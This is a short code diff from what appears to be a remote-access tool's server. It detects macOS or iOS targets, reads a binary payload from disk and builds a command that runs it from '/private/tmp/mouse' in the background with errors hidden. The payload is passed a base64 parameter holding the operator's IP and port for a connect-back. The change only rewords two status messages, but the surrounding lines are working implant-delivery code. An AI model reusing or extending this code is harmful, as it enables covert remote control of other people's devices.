@@ -105,7 +105,7 @@ class Server:
             return
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
-            self.verbose_print("Detected macOS Device")
+            self.verbose_print("Connecting to macOS...")
             self.verbose_print("Sending macOS Payload...")
             f = open("resources/macos", "rb")
             payload = f.read()
@@ -117,7 +117,7 @@ class Server:
             "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
-            self.verbose_print("Detected iOS Device")
+            self.verbose_print("Connecting to iOS...")
             self.verbose_print("Sending iOS Payload...")
             f = open("resources/ios", "rb")
             payload = f.read()
